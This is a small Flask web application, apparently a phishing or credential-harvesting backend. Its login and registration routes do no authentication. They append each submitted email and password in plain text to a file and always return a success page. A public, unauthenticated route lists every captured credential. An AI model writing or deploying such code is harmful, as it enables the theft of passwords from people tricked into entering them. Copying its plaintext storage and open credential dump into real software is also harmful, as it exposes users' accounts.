from flask import Flask, request, render_template

app = Flask(__name__)

@app.route("/")
def index():
    return render_template("login.html")

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "GET":
        return render_template("login.html")

    # Procesar POST login
    email = request.form["email"]
    password = request.form["password"]
    
    with open("credentials.txt", "a") as f:
        f.write(f"LOGIN - {email}:{password}\n")
    
    return render_template("success.html")

@app.route("/registro")
def registro():
    return render_template("register.html")

@app.route("/register", methods=["POST"])
def register():
    email = request.form["email"]
    password = request.form["password"]
    
    with open("credentials.txt", "a") as f:
        f.write(f"REGISTRO - {email}:{password}\n")
    
    return render_template("success.html")

# Nueva ruta para ver credenciales guardadas (solo para pruebas)
@app.route("/ver-credenciales")
def ver_credenciales():
    try:
        with open("credentials.txt", "r") as f:
            contenido = f.read()
        return f"<pre>{contenido}</pre>"
    except FileNotFoundError:
        return "No hay credenciales guardadas aún."

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)
